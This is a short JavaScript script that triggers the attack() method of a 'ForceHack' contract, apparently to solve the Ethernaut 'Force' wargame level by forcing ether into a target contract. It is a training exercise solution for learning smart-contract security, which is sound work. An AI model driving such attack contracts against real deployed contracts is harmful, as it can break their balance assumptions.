const { signer, getContract } = require('../web3wrapper');

async function execute(address, targetAddress) {
    const contract = getContract('ForceHack', address);
    console.log('#################ForceHack#################');

    await contract.methods.attack(targetAddress).send({
        from: signer.address,
        value: '1000',
    });

    console.log('done!!! go back to ethernaut and check the balance of Force contract.');
}

module.exports = execute;